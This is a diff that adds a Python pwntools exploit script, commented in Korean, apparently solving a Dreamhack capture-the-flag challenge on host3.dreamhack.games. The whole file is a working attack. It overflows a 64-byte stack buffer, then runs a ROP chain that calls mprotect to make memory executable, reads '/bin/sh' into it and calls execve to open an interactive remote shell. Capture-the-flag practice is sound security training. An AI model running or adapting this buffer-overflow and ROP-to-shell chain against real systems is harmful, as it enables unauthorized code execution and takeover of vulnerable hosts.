@@ -1,0 +1,71 @@
+from pwn import *
+import time
+
+# 컨텍스트 설정
+context.arch = 'amd64'
+# context.log_level = 'debug' # 페이로드 전송 과정을 자세히 보고 싶다면 주석을 해제하세요.
+
+# 대상 서버 접속
+p = remote('host3.dreamhack.games', 23036)
+
+# 기드라/objdump를 통해 찾은 가젯 주소들
+pop_rax_rdi = 0x401071   # v2 함수
+pop_rsi_rdx = 0x40107f   # v1 함수
+syscall_gadget = 0x401028 # syscall3 함수 내부
+
+# 메모리 주소 설정
+page_start = 0x402000    # mprotect로 권한을 부여할 페이지 시작 주소 (반드시 페이지 단위 정렬)
+safe_rbp = 0x402800      # syscall 직후 pop rbp에서 참조될 안전한 쓰기 가능 주소
+binsh_addr = 0x402500    # "/bin/sh\x00" 문자열을 기록할 주소
+
+# 1. 버퍼(0x40 bytes) + SFP(8 bytes) 덮어쓰기
+payload = b'A' * 64
+payload += p64(safe_rbp)
+
+# 2. mprotect(0x402000, 0x1000, 7) - 쓰기 및 실행 권한 획득
+payload += p64(pop_rax_rdi)
+payload += p64(10)          # rax: SYS_mprotect
+payload += p64(page_start)  # rdi: start
+payload += p64(pop_rsi_rdx)
+payload += p64(0x1000)      # rsi: len
+payload += p64(7)           # rdx: prot (PROT_READ | PROT_WRITE | PROT_EXEC)
+payload += p64(syscall_gadget)
+payload += p64(safe_rbp)    # syscall 직후 이어지는 pop rbp를 위한 더미 값
+
+# 3. read(0, binsh_addr, 0x100) - 권한을 획득한 주소에 문자열 쓰기
+payload += p64(pop_rax_rdi)
+payload += p64(0)           # rax: SYS_read
+payload += p64(0)           # rdi: fd (stdin)
+payload += p64(pop_rsi_rdx)
+payload += p64(binsh_addr)  # rsi: buf
+payload += p64(0x100)       # rdx: count
+payload += p64(syscall_gadget)
+payload += p64(safe_rbp)    # 더미 rbp
+
+# 4. execve(binsh_addr, 0, 0) - 셸 실행
+payload += p64(pop_rax_rdi)
+payload += p64(59)          # rax: SYS_execve
+payload += p64(binsh_addr)  # rdi: filename
+payload += p64(pop_rsi_rdx)
+payload += p64(0)           # rsi: argv
+payload += p64(0)           # rdx: envp
+payload += p64(syscall_gadget)
+payload += p64(safe_rbp)    # 더미 rbp
+
+# 첫 번째 read가 500바이트를 읽으므로 남은 공간을 null로 꽉 채움
+payload = payload.ljust(500, b'\x00')
+
+# 페이로드 전송
+p.sendafter(b"Input: ", payload)
+
+# ROP 체인이 실행되어 sys_read가 호출될 때까지 아주 짧은 대기 시간 부여
+time.sleep(0.1)
+
+# /bin/sh 문자열 전송 (sendline 대신 send를 사용하여 불필요한 개행문자 방지)
+p.send(b"/bin/sh\x00")
+
+# 성공 메시지 출력
+log.success("Solve your own problems")
+
+# 인터랙티브 셸 진입
+p.interactive()
